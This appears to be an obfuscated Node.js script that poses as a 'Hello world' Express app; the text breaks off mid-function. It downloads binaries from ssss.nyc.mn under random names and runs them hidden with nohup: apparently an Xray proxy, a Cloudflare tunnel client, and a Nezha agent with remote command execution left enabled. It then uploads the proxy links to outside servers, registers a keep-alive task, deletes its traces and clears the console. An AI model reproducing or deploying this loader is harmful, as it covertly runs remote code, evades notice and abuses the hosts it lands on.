const _0x7a85c=_0x5836;(function(_0x5b5377,_0x1f3f2a){const _0x20dda2=_0x5836,_0x25fc4f=_0x5b5377();while(!![]){try{const _0x34a5c0=-parseInt(_0x20dda2(0x127))/0x1+-parseInt(_0x20dda2(0x104))/0x2*(parseInt(_0x20dda2(0xb1))/0x3)+-parseInt(_0x20dda2(0x10b))/0x4*(parseInt(_0x20dda2(0xad))/0x5)+-parseInt(_0x20dda2(0x90))/0x6+-parseInt(_0x20dda2(0xd7))/0x7*(parseInt(_0x20dda2(0xa8))/0x8)+parseInt(_0x20dda2(0x105))/0x9+parseInt(_0x20dda2(0x132))/0xa;if(_0x34a5c0===_0x1f3f2a)break;else _0x25fc4f['push'](_0x25fc4f['shift']());}catch(_0x59bce5){_0x25fc4f['push'](_0x25fc4f['shift']());}}}(_0x449d,0xad9b8));const express=require(_0x7a85c(0xf8)),app=express(),axios=require(_0x7a85c(0x9e)),os=require('os'),fs=require('fs'),path=require(_0x7a85c(0x144)),{promisify}=require('util'),exec=promisify(require(_0x7a85c(0x99))[_0x7a85c(0x88)]),{execSync}=require(_0x7a85c(0x99)),UPLOAD_URL=process['env'][_0x7a85c(0x93)]||'',PROJECT_URL=process[_0x7a85c(0x13c)][_0x7a85c(0x149)]||'',AUTO_ACCESS=process[_0x7a85c(0x13c)][_0x7a85c(0x143)]||![],FILE_PATH=process['env'][_0x7a85c(0xe9)]||_0x7a85c(0xff),SUB_PATH=process['env'][_0x7a85c(0xb3)]||_0x7a85c(0xc5),PORT=process[_0x7a85c(0x13c)][_0x7a85c(0xb6)]||process[_0x7a85c(0x13c)]['PORT']||0xbb8,UUID=process[_0x7a85c(0x13c)][_0x7a85c(0x145)]||_0x7a85c(0x9b),NEZHA_SERVER=process[_0x7a85c(0x13c)][_0x7a85c(0x91)]||'',NEZHA_PORT=process[_0x7a85c(0x13c)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x7a85c(0x13c)][_0x7a85c(0x111)]||'',ARGO_DOMAIN=process[_0x7a85c(0x13c)][_0x7a85c(0x146)]||_0x7a85c(0xae),ARGO_AUTH=process[_0x7a85c(0x13c)][_0x7a85c(0x101)]||_0x7a85c(0xb0),ARGO_PORT=process[_0x7a85c(0x13c)][_0x7a85c(0x10d)]||0x1f41,CFIP=process[_0x7a85c(0x13c)][_0x7a85c(0xd3)]||_0x7a85c(0xfd),CFPORT=process[_0x7a85c(0x13c)][_0x7a85c(0xa7)]||0x1bb,NAME=process[_0x7a85c(0x13c)][_0x7a85c(0x128)]||_0x7a85c(0xc5);!fs[_0x7a85c(0xe4)](FILE_PATH)?(fs[_0x7a85c(0x13e)](FILE_PATH),console[_0x7a85c(0xc8)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x55508a=_0x7a85c,_0x4e32d0=_0x55508a(0x14a);let _0x4414ad='';for(let _0x5550c7=0x0;_0x5550c7<0x6;_0x5550c7++){_0x4414ad+=_0x4e32d0['charAt'](Math[_0x55508a(0xcd)](Math[_0x55508a(0x120)]()*_0x4e32d0[_0x55508a(0x139)]));}return _0x4414ad;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x7a85c(0xc9)](FILE_PATH,npmName),phpPath=path[_0x7a85c(0xc9)](FILE_PATH,phpName),webPath=path[_0x7a85c(0xc9)](FILE_PATH,webName),botPath=path[_0x7a85c(0xc9)](FILE_PATH,botName),subPath=path[_0x7a85c(0xc9)](FILE_PATH,_0x7a85c(0xd8)),listPath=path[_0x7a85c(0xc9)](FILE_PATH,_0x7a85c(0x12d)),bootLogPath=path[_0x7a85c(0xc9)](FILE_PATH,_0x7a85c(0x121)),configPath=path[_0x7a85c(0xc9)](FILE_PATH,_0x7a85c(0x117));function deleteNodes(){const _0x5978be=_0x7a85c;try{if(!UPLOAD_URL)return;if(!fs[_0x5978be(0xe4)](subPath))return;let _0x457221;try{_0x457221=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x52c9d2=Buffer[_0x5978be(0xbb)](_0x457221,_0x5978be(0xc4))[_0x5978be(0xf0)](_0x5978be(0x8d)),_0x1e6ca7=_0x52c9d2[_0x5978be(0xc7)]('\x0a')['filter'](_0x4bfc1a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4bfc1a));if(_0x1e6ca7[_0x5978be(0x139)]===0x0)return;return axios[_0x5978be(0x138)](UPLOAD_URL+_0x5978be(0x102),JSON[_0x5978be(0xcb)]({'nodes':_0x1e6ca7}),{'headers':{'Content-Type':_0x5978be(0x11f)}})['catch'](_0x1a5e47=>{return null;}),null;}catch(_0x4cd29d){return null;}}function cleanupOldFiles(){const _0x4f2d86=_0x7a85c;try{const _0x3a1d16=fs[_0x4f2d86(0xc6)](FILE_PATH);_0x3a1d16[_0x4f2d86(0xe5)](_0x1b17bd=>{const _0x18a300=_0x4f2d86,_0x21322b=path[_0x18a300(0xc9)](FILE_PATH,_0x1b17bd);try{const _0x333e6e=fs[_0x18a300(0x118)](_0x21322b);_0x333e6e[_0x18a300(0xd1)]()&&fs['unlinkSync'](_0x21322b);}catch(_0x5ac5cd){}});}catch(_0x31ce7a){}}app[_0x7a85c(0x10f)]('/',function(_0x60781,_0x21c53d){const _0x3ef533=_0x7a85c;_0x21c53d[_0x3ef533(0x9c)]('Hello\x20world!');});function _0x5836(_0x37939c,_0x3fe4f0){_0x37939c=_0x37939c-0x87;const _0x449d56=_0x449d();let _0x5836b5=_0x449d56[_0x37939c];return _0x5836b5;}async function generateConfig(){const _0x2e9e24=_0x7a85c,_0x3c28da={'log':{'access':_0x2e9e24(0xbd),'error':_0x2e9e24(0xbd),'loglevel':_0x2e9e24(0xdf)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2e9e24(0x87),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x2e9e24(0xdf),'fallbacks':[{'dest':0xbb9},{'path':_0x2e9e24(0xb2),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x2e9e24(0xbc),'dest':0xbbc}]},'streamSettings':{'network':_0x2e9e24(0x11d)}},{'port':0xbb9,'listen':_0x2e9e24(0x13f),'protocol':_0x2e9e24(0x87),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x2e9e24(0x11d),'security':'none'}},{'port':0xbba,'listen':_0x2e9e24(0x13f),'protocol':_0x2e9e24(0x87),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2e9e24(0xdf)},'streamSettings':{'network':'ws','security':_0x2e9e24(0xdf),'wsSettings':{'path':_0x2e9e24(0xb2)}},'sniffing':{'enabled':!![],'destOverride':[_0x2e9e24(0x109),_0x2e9e24(0x9d),_0x2e9e24(0x106)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2e9e24(0x13f),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2e9e24(0x148)}},'sniffing':{'enabled':!![],'destOverride':[_0x2e9e24(0x109),'tls',_0x2e9e24(0x106)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2e9e24(0x13f),'protocol':_0x2e9e24(0x141),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2e9e24(0xdf),'wsSettings':{'path':_0x2e9e24(0xbc)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2e9e24(0x9d),_0x2e9e24(0x106)],'metadataOnly':![]}}],'dns':{'servers':[_0x2e9e24(0xec)]},'outbounds':[{'protocol':_0x2e9e24(0x11e),'tag':_0x2e9e24(0xdc)},{'protocol':'blackhole','tag':_0x2e9e24(0xab)}]};fs[_0x2e9e24(0xde)](path[_0x2e9e24(0xc9)](FILE_PATH,_0x2e9e24(0x117)),JSON[_0x2e9e24(0xcb)](_0x3c28da,null,0x2));}function getSystemArchitecture(){const _0x474f7f=_0x7a85c,_0x3959b9=os[_0x474f7f(0xa2)]();return _0x3959b9===_0x474f7f(0x135)||_0x3959b9===_0x474f7f(0xd5)||_0x3959b9===_0x474f7f(0xaf)?_0x474f7f(0x135):_0x474f7f(0x13d);}function downloadFile(_0x3629d6,_0x2384e1,_0x1275d8){const _0x2ed703=_0x7a85c,_0x3a10fc=_0x3629d6;!fs[_0x2ed703(0xe4)](FILE_PATH)&&fs[_0x2ed703(0x13e)](FILE_PATH,{'recursive':!![]});const _0x52866a=fs[_0x2ed703(0x14b)](_0x3a10fc);axios({'method':'get','url':_0x2384e1,'responseType':_0x2ed703(0xf7)})['then'](_0x387850=>{const _0x29e8ce=_0x2ed703;_0x387850['data'][_0x29e8ce(0xf1)](_0x52866a),_0x52866a['on'](_0x29e8ce(0x116),()=>{const _0x2ddffd=_0x29e8ce;_0x52866a[_0x2ddffd(0xb4)](),console[_0x2ddffd(0xc8)](_0x2ddffd(0xaa)+path[_0x2ddffd(0x115)](_0x3a10fc)+'\x20successfully'),_0x1275d8(null,_0x3a10fc);}),_0x52866a['on'](_0x29e8ce(0xed),_0x4cd5be=>{const _0x2ab4d5=_0x29e8ce;fs[_0x2ab4d5(0x92)](_0x3a10fc,()=>{});const _0x50f67c='Download\x20'+path[_0x2ab4d5(0x115)](_0x3a10fc)+_0x2ab4d5(0x126)+_0x4cd5be[_0x2ab4d5(0x119)];console[_0x2ab4d5(0xed)](_0x50f67c),_0x1275d8(_0x50f67c);});})['catch'](_0xf12528=>{const _0x31c8bd=_0x2ed703,_0x4b4127=_0x31c8bd(0xaa)+path['basename'](_0x3a10fc)+_0x31c8bd(0x126)+_0xf12528[_0x31c8bd(0x119)];console[_0x31c8bd(0xed)](_0x4b4127),_0x1275d8(_0x4b4127);});}async function downloadFilesAndRun(){const _0x5386b3=_0x7a85c,_0x3d67c9=getSystemArchitecture(),_0x5ee851=getFilesForArchitecture(_0x3d67c9);if(_0x5ee851['length']===0x0){console[_0x5386b3(0xc8)](_0x5386b3(0x107));return;}const _0x1fe494=_0x5ee851['map'](_0x11db1d=>{return new Promise((_0x4df2a1,_0x29e1fd)=>{const _0x5490e7=_0x5836;downloadFile(_0x11db1d[_0x5490e7(0xeb)],_0x11db1d[_0x5490e7(0xd4)],(_0x4d421a,_0x27a699)=>{_0x4d421a?_0x29e1fd(_0x4d421a):_0x4df2a1(_0x27a699);});});});try{await Promise[_0x5386b3(0x13b)](_0x1fe494);}catch(_0x18557f){console['error'](_0x5386b3(0x130),_0x18557f);return;}function _0x46487f(_0x331f14){const _0x4b8dd6=_0x5386b3,_0x1d1a17=0x1fd;_0x331f14[_0x4b8dd6(0xe5)](_0x48724f=>{const _0x2fb139=_0x4b8dd6;fs[_0x2fb139(0xe4)](_0x48724f)&&fs[_0x2fb139(0x96)](_0x48724f,_0x1d1a17,_0x1bd605=>{const _0x556b90=_0x2fb139;_0x1bd605?console['error'](_0x556b90(0xe0)+_0x48724f+':\x20'+_0x1bd605):console['log'](_0x556b90(0xa4)+_0x48724f+':\x20'+_0x1d1a17[_0x556b90(0xf0)](0x8));});});}const _0x16fd59=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x46487f(_0x16fd59);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4050c6=NEZHA_SERVER[_0x5386b3(0xce)](':')?NEZHA_SERVER[_0x5386b3(0xc7)](':')[_0x5386b3(0x11b)]():'',_0x660f1c=new Set([_0x5386b3(0xca),_0x5386b3(0x142),_0x5386b3(0x100),'2087',_0x5386b3(0xe6),'2053']),_0x3fd718=_0x660f1c[_0x5386b3(0xe3)](_0x4050c6)?_0x5386b3(0xbf):_0x5386b3(0xc2),_0x944f13=_0x5386b3(0x13a)+NEZHA_KEY+_0x5386b3(0xf4)+NEZHA_SERVER+_0x5386b3(0x89)+_0x3fd718+_0x5386b3(0x131)+UUID;fs[_0x5386b3(0xde)](path[_0x5386b3(0xc9)](FILE_PATH,'config.yaml'),_0x944f13);const _0x4cda84=_0x5386b3(0xac)+phpPath+_0x5386b3(0x114)+FILE_PATH+_0x5386b3(0x9a);try{await exec(_0x4cda84),console[_0x5386b3(0xc8)](phpName+_0x5386b3(0xf5)),await new Promise(_0x569d71=>setTimeout(_0x569d71,0x3e8));}catch(_0x38cb97){console['error'](_0x5386b3(0x10e)+_0x38cb97);}}else{let _0x163d2d='';const _0x5b17e4=[_0x5386b3(0xca),'8443',_0x5386b3(0x100),'2087','2083',_0x5386b3(0xef)];_0x5b17e4['includes'](NEZHA_PORT)&&(_0x163d2d='--tls');const _0x576c87=_0x5386b3(0xac)+npmPath+_0x5386b3(0xcf)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x163d2d+_0x5386b3(0x9f);try{await exec(_0x576c87),console[_0x5386b3(0xc8)](npmName+_0x5386b3(0xf5)),await new Promise(_0x45dd5f=>setTimeout(_0x45dd5f,0x3e8));}catch(_0x1566a5){console[_0x5386b3(0xed)](_0x5386b3(0x98)+_0x1566a5);}}}else console['log'](_0x5386b3(0x137));const _0x1a7f17=_0x5386b3(0xac)+webPath+_0x5386b3(0x97)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1a7f17),console[_0x5386b3(0xc8)](webName+'\x20is\x20running'),await new Promise(_0x454888=>setTimeout(_0x454888,0x3e8));}catch(_0x246ebb){console[_0x5386b3(0xed)]('web\x20running\x20error:\x20'+_0x246ebb);}if(fs[_0x5386b3(0xe4)](botPath)){let _0x335e6d;if(ARGO_AUTH[_0x5386b3(0xa3)](/^[A-Z0-9a-z=]{120,250}$/))_0x335e6d='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5386b3(0xa3)](/TunnelSecret/)?_0x335e6d='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5386b3(0x94):_0x335e6d=_0x5386b3(0xf3)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x335e6d+_0x5386b3(0x123)),console[_0x5386b3(0xc8)](botName+'\x20is\x20running'),await new Promise(_0x1df4eb=>setTimeout(_0x1df4eb,0x7d0));}catch(_0x4e1817){console[_0x5386b3(0xed)]('Error\x20executing\x20command:\x20'+_0x4e1817);}}await new Promise(_0xad13fa=>setTimeout(_0xad13fa,0x1388));}function getFilesForArchitecture(_0x527d65){const _0x5bdec3=_0x7a85c;let _0x303d42;_0x527d65===_0x5bdec3(0x135)?_0x303d42=[{'fileName':webPath,'fileUrl':_0x5bdec3(0x103)},{'fileName':botPath,'fileUrl':_0x5bdec3(0xf9)}]:_0x303d42=[{'fileName':webPath,'fileUrl':_0x5bdec3(0x12a)},{'fileName':botPath,'fileUrl':_0x5bdec3(0xba)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2b4c03=_0x527d65===_0x5bdec3(0x135)?_0x5bdec3(0x95):_0x5bdec3(0xa1);_0x303d42[_0x5bdec3(0xfa)]({'fileName':npmPath,'fileUrl':_0x2b4c03});}else{const _0x10b0c8=_0x527d65===_0x5bdec3(0x135)?_0x5bdec3(0xa0):'https://amd64.ssss.nyc.mn/v1';_0x303d42[_0x5bdec3(0xfa)]({'fileName':phpPath,'fileUrl':_0x10b0c8});}}return _0x303d42;}function _0x449d(){const _0x39fe98=['bbb','readdirSync','split','log','join','443','stringify','automatic\x20access\x20task\x20added\x20successfully','floor','includes','\x20-s\x20','org','isFile','/api/add-subscriptions','CFIP','fileUrl','arm64','del\x20/f\x20/q\x20','1212687wdugKM','sub.txt','countryCode','country_code','status','direct','.exe\x20>\x20nul\x202>&1','writeFileSync','none','Empowerment\x20failed\x20for\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','taskkill\x20/f\x20/im\x20','has','existsSync','forEach','2083','push','/api/add-nodes','FILE_PATH','catch','fileName','https+local://8.8.8.8/dns-query','error','\x0avless://','2053','toString','pipe','platform','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20is\x20running','\x0a\x20\x20credentials-file:\x20','stream','express','https://arm64.ssss.nyc.mn/bot','unshift','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Skipping\x20adding\x20automatic\x20access\x20task','cdns.doon.eu.org','\x20>/dev/null\x202>&1','./tmp','2096','ARGO_AUTH','/api/delete-nodes','https://arm64.ssss.nyc.mn/web','70646qnsAej','3236841TLZCgL','quic','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','pkill\x20-f\x20\x22[','http','listen','40Fdrfaj','\x0a\x0atrojan://','ARGO_PORT','php\x20running\x20error:\x20','get','/sub.txt\x20saved\x20successfully','NEZHA_KEY','Add\x20automatic\x20access\x20task\x20faild:\x20','data','\x20-c\x20\x22','basename','finish','config.json','statSync','message','\x0a\x0avmess://','pop','Unhandled\x20error\x20in\x20startserver:','tcp','freedom','application/json','random','boot.log','http://ip-api.com/json/','\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','text/plain;\x20charset=utf-8','\x20failed:\x20','489381loXyfO','NAME','response','https://amd64.ssss.nyc.mn/web','Unknown','\x0a\x20\x20\x20\x20','list.txt','Subscription\x20uploaded\x20successfully','firefox','Error\x20downloading\x20files:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','32692830USthTW','\x0a\x20\x20tunnel:\x20','tunnel.yml','arm','http\x20server\x20is\x20running\x20on\x20port:','NEZHA\x20variable\x20is\x20empty,skip\x20running','post','length','\x0aclient_secret:\x20','all','env','amd','mkdirSync','127.0.0.1','&path=%2Ftrojan-argo%3Fed%3D2560#','trojan','8443','AUTO_ACCESS','path','UUID','ARGO_DOMAIN','win32','/vmess-argo','PROJECT_URL','abcdefghijklmnopqrstuvwxyz','createWriteStream','vless','exec','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','TunnelSecret','https://ipapi.co/json/','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','utf-8','tunnel.json','readFileSync','138276MQiUCj','NEZHA_SERVER','unlink','UPLOAD_URL','/tunnel.yml\x20run','https://arm64.ssss.nyc.mn/agent','chmod','\x20-c\x20','npm\x20running\x20error:\x20','child_process','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','f7d2b0da-26fa-450e-b580-8a83e6434527','send','tls','axios','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/agent','arch','match','Empowerment\x20success\x20for\x20','?encryption=none&security=tls&sni=','filter','CFPORT','48zgYhOZ','&fp=firefox&type=ws&host=','Download\x20','block','nohup\x20','135475GJVHVR','bbb.zack112.dpdns.org','aarch64','eyJhIjoiYTVhZDBhNGE4MzFkMWJjNThiYTMzNmIxOTBkZGNjNTciLCJ0IjoiNDFiOGM1ZjYtM2U3Yy00ZThjLWJiMDQtOTBmM2I5ODAyMWRjIiwicyI6Ik5qZGpZamd6TVdRdE9ETmlOQzAwWTJGaUxUZzBPRFl0Wm1Zd1pEUmxaREV3WmpNMSJ9','93WhSxGJ','/vless-argo','SUB_PATH','close','https://oooo.serv00.net/add-url','SERVER_PORT','clear','App\x20is\x20running','Error\x20in\x20startserver:','https://amd64.ssss.nyc.mn/bot','from','/trojan-argo','/dev/null','charAt','true','test','Error\x20executing\x20command:\x20','false','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','base64'];_0x449d=function(){return _0x39fe98;};return _0x449d();}function argoType(){const _0x403f40=_0x7a85c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x403f40(0xc8)](_0x403f40(0xc3));return;}if(ARGO_AUTH[_0x403f40(0xce)](_0x403f40(0x8a))){fs[_0x403f40(0xde)](path[_0x403f40(0xc9)](FILE_PATH,_0x403f40(0x8e)),ARGO_AUTH);const _0x4bbac5=_0x403f40(0x133)+ARGO_AUTH[_0x403f40(0xc7)]('\x22')[0xb]+_0x403f40(0xf6)+path[_0x403f40(0xc9)](FILE_PATH,_0x403f40(0x8e))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x403f40(0xe1)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x403f40(0xc9)](FILE_PATH,_0x403f40(0x134)),_0x4bbac5);}else console[_0x403f40(0xc8)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x5c68b1=_0x7a85c;let _0x9fe76b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x9fe76b=ARGO_DOMAIN,console[_0x5c68b1(0xc8)](_0x5c68b1(0x124),_0x9fe76b),await _0x51336f(_0x9fe76b);else try{const _0xaf9c60=fs[_0x5c68b1(0x8f)](path[_0x5c68b1(0xc9)](FILE_PATH,_0x5c68b1(0x121)),'utf-8'),_0x3f8ce5=_0xaf9c60[_0x5c68b1(0xc7)]('\x0a'),_0x1ded58=[];_0x3f8ce5[_0x5c68b1(0xe5)](_0x4e8440=>{const _0x8f009a=_0x5c68b1,_0x1251ba=_0x4e8440[_0x8f009a(0xa3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1251ba){const _0x53d298=_0x1251ba[0x1];_0x1ded58[_0x8f009a(0xe7)](_0x53d298);}});if(_0x1ded58[_0x5c68b1(0x139)]>0x0)_0x9fe76b=_0x1ded58[0x0],console['log']('ArgoDomain:',_0x9fe76b),await _0x51336f(_0x9fe76b);else{console[_0x5c68b1(0xc8)](_0x5c68b1(0xfb)),fs['unlinkSync'](path[_0x5c68b1(0xc9)](FILE_PATH,_0x5c68b1(0x121)));async function _0x4f6e1b(){const _0xabd3c8=_0x5c68b1;try{process[_0xabd3c8(0xf2)]==='win32'?await exec(_0xabd3c8(0xe2)+botName+_0xabd3c8(0xdd)):await exec(_0xabd3c8(0x108)+botName[_0xabd3c8(0xbe)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x153ae4){}}_0x4f6e1b(),await new Promise(_0x12a546=>setTimeout(_0x12a546,0xbb8));const _0x2f8447='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5c68b1(0x8c)+ARGO_PORT;try{await exec(_0x5c68b1(0xac)+botPath+'\x20'+_0x2f8447+_0x5c68b1(0x123)),console[_0x5c68b1(0xc8)](botName+_0x5c68b1(0xf5)),await new Promise(_0x879b58=>setTimeout(_0x879b58,0xbb8)),await extractDomains();}catch(_0x3fd9c4){console['error'](_0x5c68b1(0xc1)+_0x3fd9c4);}}}catch(_0x1f18e5){console[_0x5c68b1(0xed)]('Error\x20reading\x20boot.log:',_0x1f18e5);}async function _0x397bf3(){const _0x341245=_0x5c68b1;try{const _0x4d53a6=await axios[_0x341245(0x10f)](_0x341245(0x8b),{'timeout':0xbb8});if(_0x4d53a6[_0x341245(0x113)]&&_0x4d53a6[_0x341245(0x113)][_0x341245(0xda)]&&_0x4d53a6[_0x341245(0x113)]['org'])return _0x4d53a6[_0x341245(0x113)][_0x341245(0xda)]+'_'+_0x4d53a6[_0x341245(0x113)][_0x341245(0xd0)];}catch(_0x612c83){try{const _0x523981=await axios[_0x341245(0x10f)](_0x341245(0x122),{'timeout':0xbb8});if(_0x523981[_0x341245(0x113)]&&_0x523981['data'][_0x341245(0xdb)]==='success'&&_0x523981['data'][_0x341245(0xd9)]&&_0x523981[_0x341245(0x113)][_0x341245(0xd0)])return _0x523981[_0x341245(0x113)][_0x341245(0xd9)]+'_'+_0x523981[_0x341245(0x113)]['org'];}catch(_0x73253f){}}return _0x341245(0x12b);}async function _0x51336f(_0x481084){const _0x3d2e22=await _0x397bf3(),_0x2b761a=NAME?NAME+'-'+_0x3d2e22:_0x3d2e22;return new Promise(_0x1dc72c=>{setTimeout(()=>{const _0x1221ba=_0x5836,_0x4f910a={'v':'2','ps':''+_0x2b761a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1221ba(0xdf),'net':'ws','type':_0x1221ba(0xdf),'host':_0x481084,'path':'/vmess-argo?ed=2560','tls':_0x1221ba(0x9d),'sni':_0x481084,'alpn':'','fp':_0x1221ba(0x12f)},_0x262c04=_0x1221ba(0xee)+UUID+'@'+CFIP+':'+CFPORT+_0x1221ba(0xa5)+_0x481084+_0x1221ba(0xa9)+_0x481084+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2b761a+_0x1221ba(0x11a)+Buffer[_0x1221ba(0xbb)](JSON['stringify'](_0x4f910a))[_0x1221ba(0xf0)](_0x1221ba(0xc4))+_0x1221ba(0x10c)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x481084+'&fp=firefox&type=ws&host='+_0x481084+_0x1221ba(0x140)+_0x2b761a+_0x1221ba(0x12c);console[_0x1221ba(0xc8)](Buffer[_0x1221ba(0xbb)](_0x262c04)[_0x1221ba(0xf0)](_0x1221ba(0xc4))),fs[_0x1221ba(0xde)](subPath,Buffer['from'](_0x262c04)[_0x1221ba(0xf0)](_0x1221ba(0xc4))),console[_0x1221ba(0xc8)](FILE_PATH+_0x1221ba(0x110)),uploadNodes(),app[_0x1221ba(0x10f)]('/'+SUB_PATH,(_0x37308f,_0x25fc15)=>{const _0xff47e=_0x1221ba,_0x557ca9=Buffer['from'](_0x262c04)[_0xff47e(0xf0)](_0xff47e(0xc4));_0x25fc15['set']('Content-Type',_0xff47e(0x125)),_0x25fc15['send'](_0x557ca9);}),_0x1dc72c(_0x262c04);},0x7d0);});}}async function uploadNodes(){const _0x43e9ab=_0x7a85c;if(UPLOAD_URL&&PROJECT_URL){const _0x2a9e2f=PROJECT_URL+'/'+SUB_PATH,_0x36e7d5={'subscription':[_0x2a9e2f]};try{const _0x5af3bf=await axios[_0x43e9ab(0x138)](UPLOAD_URL+_0x43e9ab(0xd2),_0x36e7d5,{'headers':{'Content-Type':_0x43e9ab(0x11f)}});return _0x5af3bf&&_0x5af3bf[_0x43e9ab(0xdb)]===0xc8?(console[_0x43e9ab(0xc8)](_0x43e9ab(0x12e)),_0x5af3bf):null;}catch(_0x228e4e){if(_0x228e4e[_0x43e9ab(0x129)]){if(_0x228e4e['response'][_0x43e9ab(0xdb)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2eef90=fs[_0x43e9ab(0x8f)](listPath,_0x43e9ab(0x8d)),_0x46e946=_0x2eef90['split']('\x0a')[_0x43e9ab(0xa6)](_0x53f698=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x43e9ab(0xc0)](_0x53f698));if(_0x46e946['length']===0x0)return;const _0x181fa9=JSON[_0x43e9ab(0xcb)]({'nodes':_0x46e946});try{const _0x6d2aac=await axios[_0x43e9ab(0x138)](UPLOAD_URL+_0x43e9ab(0xe8),_0x181fa9,{'headers':{'Content-Type':_0x43e9ab(0x11f)}});return _0x6d2aac&&_0x6d2aac[_0x43e9ab(0xdb)]===0xc8?(console[_0x43e9ab(0xc8)]('Nodes\x20uploaded\x20successfully'),_0x6d2aac):null;}catch(_0x51f8d1){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1f8d13=_0x5836,_0x4dc77f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4dc77f[_0x1f8d13(0xe7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4dc77f[_0x1f8d13(0xe7)](phpPath);process[_0x1f8d13(0xf2)]===_0x1f8d13(0x147)?exec(_0x1f8d13(0xd6)+_0x4dc77f[_0x1f8d13(0xc9)]('\x20')+'\x20>\x20nul\x202>&1',_0xa1c09d=>{const _0x142ec8=_0x1f8d13;console[_0x142ec8(0xb7)](),console[_0x142ec8(0xc8)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x4dc77f['join']('\x20')+_0x1f8d13(0xfe),_0x1025b4=>{const _0x51bcda=_0x1f8d13;console['clear'](),console['log'](_0x51bcda(0xb8)),console[_0x51bcda(0xc8)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4a2806=_0x7a85c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4a2806(0xc8)](_0x4a2806(0xfc));return;}try{const _0x24036c=await axios[_0x4a2806(0x138)](_0x4a2806(0xb5),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4a2806(0x11f)}});return console[_0x4a2806(0xc8)](_0x4a2806(0xcc)),_0x24036c;}catch(_0x2eea08){return 